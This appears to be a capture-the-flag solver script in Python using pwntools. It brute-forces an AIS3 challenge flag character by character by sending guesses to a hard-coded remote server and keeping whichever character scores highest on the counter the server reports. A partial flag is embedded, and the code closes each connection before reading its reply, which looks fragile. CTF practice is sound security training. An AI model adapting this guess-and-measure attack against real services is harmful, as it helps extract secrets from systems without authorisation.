#!/usr/bin/env python
from pwn import *
import string

ans = 'AIS3{'
Zans = 'AIS3{A1r1ght_U_4r3_my_3n3nnies'

flagchar = '_!0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


while True:

    max = -1
    max_char = ''
    for char in flagchar:
        str1 = char
        time = 0
        for i in range(5):
            c = remote('60.250.197.227', 11001)
            c.sendline(ans + str1)
            c.recvuntil('Haha, you lose in ') # drop
            c.close()
            time += int(c.recvuntil(' '))

        if max == -1 or max < time:
            max = time
            max_char = str1
    print(max)
    print(max_char)
    ans += max_char
    print (ans)
